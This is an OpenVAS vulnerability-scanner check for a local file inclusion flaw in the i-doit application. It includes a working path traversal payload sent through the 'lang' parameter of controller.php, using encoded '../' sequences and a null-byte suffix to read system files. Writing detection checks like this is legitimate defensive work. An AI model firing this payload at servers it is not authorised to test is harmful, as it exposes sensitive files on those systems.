###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_i_doit_lang_parameter_lfi_vuln.nasl 7577 2017-10-26 10:41:56Z cfischer $
#
# i-doit 'lang' Parameter Local File Include Vulnerability
#
# Authors:
# Shashi Kiran N <nskiran@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902601");
  script_version("$Revision: 7577 $");
  script_tag(name:"last_modification", value:"$Date: 2017-10-26 12:41:56 +0200 (Thu, 26 Oct 2017) $");
  script_tag(name:"creation_date", value:"2011-06-24 16:31:03 +0200 (Fri, 24 Jun 2011)");
  script_bugtraq_id(47972);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_name("i-doit 'lang' Parameter Local File Include Vulnerability");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/17320/");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 SecPod");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name : "impact" , value : "Successful exploitation could allow an attacker to gain sensitive
  information.

  Impact Level: Application");
  script_tag(name : "affected" , value : "i-doit version 0.9.9-4 and earlier.");
  script_tag(name : "insight" , value : "The flaw is caused by improper validation of user supplied input
  via the 'lang' parameter in 'controller.php', which allows attackers to read
  arbitrary files via a ../(dot dot) sequences.");
  script_tag(name : "solution" , value : "No solution or patch was made available for at least one year
  since disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one.");
  script_tag(name : "summary" , value : "This host is running I-doit and is prone to local file inclusion
  vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");
  exit(0);
}

include("misc_func.inc");
include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:80);

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Check for each possible path
foreach dir (make_list_unique("/idoit", "/", cgi_dirs(port:port)))
{

  if(dir == "/") dir = "";

  ## Send and Receive the response
  res = http_get_cache(item: dir + "/index.php", port:port);

  ## Confirm the application
  if("i-doit.org" >< res && "<title>i-doit - </title>" >< res)
  {
    files = traversal_files();

    foreach file (keys(files))
    {
      ## Constructs exploit string
      url = string(dir, "/controller.php?load=&lang=..%2f..%2f..%2f..%2f" +
                        "..%2f..%2f..%2f..%2f", files[file],"%00.jpg");

      ## Confirm exploit worked properly or not
      if(http_vuln_check(port:port, url:url, pattern:file))
      {
        security_message(port:port);
        exit(0);
      }
    }
  }
}

exit(99);